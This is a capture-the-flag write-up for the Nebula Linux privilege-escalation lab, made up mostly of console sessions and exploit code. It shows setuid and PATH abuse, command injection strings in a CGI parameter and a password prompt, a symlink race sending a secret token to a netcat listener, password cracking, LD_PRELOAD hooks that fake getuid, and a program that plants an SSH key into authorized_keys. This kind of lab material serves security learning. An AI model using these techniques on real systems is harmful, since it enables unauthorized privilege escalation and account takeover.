Nebula Writeup
==============

## 00
```console
level00@nebula:~$ find / -nowarn -perm +04000 -user flag00 2> /dev/null 
/bin/.../flag00
/rofs/bin/.../flag00
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ /bin/getflag 
You have successfully executed getflag on a target account
```

## 01
```console
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ PATH=.:$PATH /home/flag01/flag01
You have successfully executed getflag on a target account
```

## 02
```console
level02@nebula:~$ USER="\`/bin/getflag\`" /home/flag02/flag02 
You have successfully executed getflag on a target account is coolo
```

## 03
```console
level03@nebula:~$ cat run.sh 
#!/bin/bash
/bin/getflag > /tmp/flag03.out
level03@nebula:~$ chmod +x run.sh 
level03@nebula:~$ cp run.sh ../flag03/writable.d/
level03@nebula:~$ watch ls -l  ../flag03/writable.d/ /tmp
level03@nebula:~$ more /tmp/flag03.out 
You have successfully executed getflag on a target account
```

### 04
```console
level04@nebula:~$ ln -s ../flag04/token link
level04@nebula:~$ ../flag04/flag04 link 
06508b5e-8909-4f38-b630-fdb148a848a2
```

## 05 
```console
ls -la ../flag05/
total 5
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
ls -la ../flag05/.backup:
total 2
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:~$ cp ../flag05/.backup/backup-19072011.tgz ./
level05@nebula:~$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:~$ ssh -i .ssh/id_rsa flag05@localhost
flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 06
```console
imac:run gwyn$ cat passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
imac:run gwyn$ ./john passwd
Warning: detected hash type "descrypt", but the string is also recognized as "descrypt-opencl"
Use the "--format=descrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2-16])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 DONE 2/3 (2018-04-01 12:36) 25.00g/s 425700p/s 425700c/s 425700C/s 123456..betabeta
Use the "--show" option to display all of the cracked passwords reliably
Session completed
...
level06@nebula:~$ su - flag06
Password: 
flag06@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 07
```console
level07@nebula:~$ wget -O - http://127.0.0.1:7007/index.cgi?Host="-c 0 localhost | getflag"
--2018-04-03 14:18:19--  http://127.0.0.1:7007/index.cgi?Host=-c%200%20localhost%20%7C%20getflag
Connecting to 127.0.0.1:7007... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: `STDOUT'

    [<=>                                                       ] 0           --.-K/s              <html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
    [ <=>                                                      ] 136         --.-K/s   in 0.003s  

2018-04-03 14:18:19 (50.8 KB/s) - written to stdout [136]
```

## 08
Locate the pcap capture file, copy it off to a system where you can run Wireshark on it.

Within Wireshark, follow the TCP stream, although you'll need to switch "Show data as" to "Hex Dump" to see that the '.'s are 7f's, i.e. DELs
```console
level08@nebula:~$ su - flag08
Password: 
flag08@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## 09
I skipped this one, after some initial investigations as PHP's not really my thing ATM.

## 10
This one's a "time-of-use to time-of-check" vulnerability and relies on swapping the target between the access check and the open calls.
My instinct is to try for a one-shot approach, but actually, the required info can be easiest obtained by having 3 processes going, as follows:
1. This is simply a network listener set to keep listening - `nc -lk 18211`
2. This is process continuously loops trying to read a target - `while true; do ../flag10/flag10 target 127.0.0.1; done`
3. While this process continuously swaps the target between pointing to an accessable file and the token file - `while true; do ln -sf dummy target; ln -sf ../flag10/token target; done` 

Quite quickly, you should see the token on the console of process 1...
```console
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
dummy
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
...
```

## 11
Two approaches here, but neither are 100%, although I think they're part of the way...

1 - Python to encrypt the cmd & provide it as input

```python
string = "/bin/getflag\x00"
key = 0
 
enc_string = ""
 
for char in string:
    enc_char = ord(char) ^ key & 0xff
    enc_string += chr(enc_char)
    key = key - ord(char) & 0xff
 
print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
```
then run as below
```console
level11@nebula:~$ python level11.py | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn't count
```

2 - LD_PRELOAD to hijack a few routines...
```c
// Take control of random
int random(){
   return 0;
}

// Stop the file being deleted
int unlink(const char *pathname) {
   return 0;
}

// Take control of the reported PID
int getpid() {
   return 1;
}
```
build via `gcc --shared -fPIC level11b.c -o level11b.o` then use via `python level11.py LD_PRELOAD=$PWD/level11b.o ../flag11/flag11`.
Also do `export TEMP=/tmp`

If working, should see `/tmp/1.A0aA0a` be created and filled with the Python payload.

Generate an SSH key via `echo -e "/tmp/level11.key" | ssh-keygen -t rsa -b 2048 -C "level11@nebula"` then use the pubkey in a Python script such as
```python
#!/usr/bin/env python

command = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqcnvJfk6hxg1U3fSk8x2BOJhV85tmOBAJ3cq1coggJaSKNlaJYnfY7Kyc/Sxhi7KDZYv1CXMRefD4nboQbMteRZouRoE3w11tT38scb5tkrXrZll
cHFMG1v/3MPFYYoG2lx8XXsRmSqYJoEk4Q46MiWPvn6b5Cyr6+VUNeV5uck/RIKuUG76uqqjH9/QRUZ9CATjFbDJoY6nXZFVJh4/az7++8wR1kw1Y6Vbs3enLaIWZup2wx89RSenW6N3aszwCwH7QlLhca/qVP7EGF
fUZD3S+zfxbSUb3LO+eBmA3/iMbzvFdFhF1jVDtu4QFzmu77ZZ8JGlHLi4IfNLkp4BX level11@nebula\x00"
length = 1024

print "Content-Length: " + str(length) + "\n" + command + '\x00' + "A"*(length - len(command))
```
and that should write the key to the temp file. The theory is that you should be able to link `/tmp/1.A0aA0a` to `/home/flag11/.ssh/authorized_keys` such that the ../flag11/flag11 writes the ssh key into the auth keys file, but as yet I've not got that working...  I need to check, but I suspect that the LD_PRELOAD only works if the programs run under strace, but when under strace, the setuid doesn't work, so it can't write to the authkey file...

3 - Combine writing the SSH key with 'guessing' the random values.  Attacker program 
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

int getrand(char **path, int pid, int time)
{
  char *tmp;
  int fd =  0;

  srandom(time);

  tmp = getenv("TEMP");
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));


  return fd;
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[2048] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqcnvJfk6hxg1U3fSk8x2BOJhV85tmOBAJ3cq1coggJaSKNlaJYnfY7Kyc/Sxhi7KDZYv1CXMRefD4nboQbMteRZouRoE3w11tT38scb
5tkrXrZllcHFMG1v/3MPFYYoG2lx8XXsRmSqYJoEk4Q46MiWPvn6b5Cyr6+VUNeV5uck/RIKuUG76uqqjH9/QRUZ9CATjFbDJoY6nXZFVJh4/az7++8wR1kw1Y6Vbs3enLaIWZup2wx89RSenW6N3aszwCwH7QlLhc
a/qVP7EGFfUZD3S+zfxbSUb3LO+eBmA3/iMbzvFdFhF1jVDtu4QFzmu77ZZ8JGlHLi4IfNLkp4BX level11@nebula";
  int pid;
  int fd;
  char *path;
  FILE* stream;

  pid = getpid()+1;
  getrand(&path, pid, time(NULL));
  symlink("/home/flag11/.ssh/authorized_keys",path);
  getrand(&path, pid, time(NULL)+1);
  symlink("/home/flag11/.ssh/authorized_keys",path);
  fprintf(stdout, "%s%d\n%s",CL,sizeof(buf),buf);
}
```
is compiled via `gcc -o level11c level11c.c` then run via `./level11c | ../flag11/flag11`.  
It sets up a couple of links to the authkeys file, by guessing the pid to be the next sequential one, then trying the file name generation with the current second and the next second as starter values.  The flag program writes to one of them (hopefully) which means that the attacker can then access the account using the private key they earlier generated: `ssh -i /tmp/level11.key flag11@127.0.0.1`

## 12
While this presents as a SHA1 hashpass, it's actually a command injection task, 
and just passing the correct string and a  command to echo a newline will be enough 
to pass the check, i.e.
```console
level12@nebula:/home/flag12$ nc 127.0.0.1 50001
Password: 4754a4f4bd5787accd33de887b9250a0691dd198 ; echo
Congrats, your token is 413**CARRIER LOST**
```
Alternatively, you can pass something like `1 ; getflag > /tmp/flag12.out` to the password prompt, then 
```console
level12@nebula:/home/flag12$ cat /tmp/flag12.out
You have successfully executed getflag on a target account
```

## 13
In this level, the setuid program makes a call to getuid to check the calling uid.
Initially I thought that the following, pre-loaded by LD_PRELOAD would be fine...
```c
#include <unistd.h>
#include <sys/types.h>

uid_t getuid(void) {
    return 1000;
}
```
Unfortunately, that's not quite right (see LD_PRELOAD in the man ld.so page)
```console
level13@nebula:~$ gcc -shared -fPIC getuid.c  -o getuid.so
level13@nebula:~$ LD_PRELOAD=$PWD/getuid.o ../flag13/flag13
Security failure detected. UID 1014 started us, we expect 1000
The system administrators will be notified of this violation
```
However, if `strace` is used, however, it works as expected... (You could copy the image to remove the flag, but this works)
```console
level13@nebula:~$ LD_PRELOAD=$PWD/getuid.so strace -c ../flag13/flag13 2>/dev/null
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

## nn
```console

```

